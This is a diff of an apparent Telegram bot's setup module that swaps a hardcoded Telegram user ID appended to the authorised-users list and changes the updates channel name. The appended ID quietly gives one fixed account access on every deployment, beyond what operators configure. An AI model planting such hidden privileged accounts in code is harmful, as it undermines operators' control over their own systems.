@@ -22,7 +22,7 @@ from bot.config import Config
 # dont think ne dumb (c) @Animes_Encoded 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(1482769753)
+AUTH_USERS.append(1666551439)
 # again lol (c) @Animes_Encoded 
 
 SESSION_NAME = Config.SESSION_NAME
@@ -39,7 +39,7 @@ UN_FINISHED_PROGRESS_STR = "▢"
 BOT_START_TIME = time.time()
 LOG_FILE_ZZGEVC = "Log.txt"
 BOT_USERNAME = Config.BOT_USERNAME 
-UPDATES_CHANNEL = "Zub0NSFWupdateS"
+UPDATES_CHANNEL = "botlogas"
 data = []
 crf = []
 watermark = []
@@ -54,8 +54,7 @@ app = Client(
         bot_token=TG_BOT_TOKEN,
         api_id=APP_ID,
         api_hash=API_HASH,
-        workers=2,
-        ipv6=True
+        workers=2
     )
 if os.path.exists(LOG_FILE_ZZGEVC):
     with open(LOG_FILE_ZZGEVC, "r+") as f_d:
